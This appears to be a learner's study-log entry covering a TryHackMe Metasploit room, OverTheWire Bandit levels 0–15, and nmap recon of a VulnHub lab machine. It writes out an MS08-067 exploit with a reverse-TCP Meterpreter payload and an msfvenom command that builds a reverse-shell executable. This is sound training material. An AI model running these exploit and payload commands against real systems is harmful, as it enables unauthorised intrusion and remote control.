# 🚀 Day 16: Metasploit | Bandit (0–15) | VulnHub Scriptkiddie

---

## 📌 Overview
Day 16 was a packed day of learning and practice across three platforms:  

1. **TryHackMe Metasploit Room** — Focused on scanning, exploitation, Metasploit database, msfvenom payloads.  
2. **OverTheWire Bandit (levels 0 → 15)** — Strengthened Linux fundamentals through practical challenges.  
3. **VulnHub: Funbox Scriptkiddie** — Beginner-friendly CTF-style machine, performed initial recon and setup.  

---

## 🔹 TryHackMe — Metasploit Room

### Key Topics
- Scanning targets with Metasploit  
- Using the Metasploit database (`msfdb`)  
- Conducting vulnerability scans  
- Exploiting vulnerable services  
- Generating payloads with `msfvenom`  
- Obtaining a Meterpreter session  

### Important Commands
```bash
# Start and initialize the Metasploit database
msfdb init

# Launch Metasploit
msfconsole

# Database-related commands
db_status
workspace -a tryhackme_lab
hosts
services

# Scan target host
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip>
set PORTS 1-1000
run

# Example exploit usage
search ms08_067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run

# Generate payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > shell.exe

🔹 OverTheWire — Bandit (Level 0 → 15)
Focus Areas
SSH basics
File permissions
Hidden files & directories
Encodings (base64, hex, gzip, bzip2)
Cron jobs
Password retrieval logic
Important Commands
# SSH into Bandit
ssh bandit0@bandit.labs.overthewire.org -p 2220

# Find hidden files
ls -la

# View file contents
cat <filename>

# Read the first line
head -n 1 <filename>

# Read the last line
tail -n 1 <filename>

# Base64 decode
cat data.txt | base64 -d

# Hex dump & reverse
xxd -r file.hex > file.out

# Search by permissions
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null

# Connect via nc
nc <host> <port>

🔹 VulnHub — Funbox: Scriptkiddie
Setup
Downloaded & imported Funbox11.ova
Added entry to /etc/hosts:
funbox11  <target_ip>

Initial Recon
# Host discovery
nmap -sn <target_network>/24

# Full port scan
nmap -p- -T4 <target_ip>

# Service and version detection
nmap -sV -sC -p <ports> <target_ip>

# Add entry for convenience
echo "<target_ip> funbox11" | sudo tee -a /etc/hosts

🔑 Key Takeaways

Metasploit is more than just an exploitation tool — its database & msfvenom features make it a full pentest framework.
Bandit reinforces Linux fundamentals that are critical in real-world scenarios.
VulnHub challenges simulate attacker workflows and build applied experience.
<img width="1920" height="1080" alt="Screenshot from 2025-08-24 14-49-24" src="https://github.com/user-attachments/assets/011b7e2b-9d9b-4540-8e3a-b2070c93229e" />
<img width="1920" height="1080" alt="Screenshot from 2025-08-24 19-50-06" src="https://github.com/user-attachments/assets/c0c080de-fe2d-4a44-b07e-df4a64d770a8" />
<img width="1920" height="1080" alt="Screenshot from 2025-08-24 21-33-34" src="https://github.com/user-attachments/assets/32246813-1829-454c-9580-eee074bb433f" />
<img width="1920" height="1080" alt="Screenshot from 2025-08-24 19-50-46" src="https://github.com/user-attachments/assets/4aabca73-9b35-4310-9f56-ecf8a11ee4f8" />

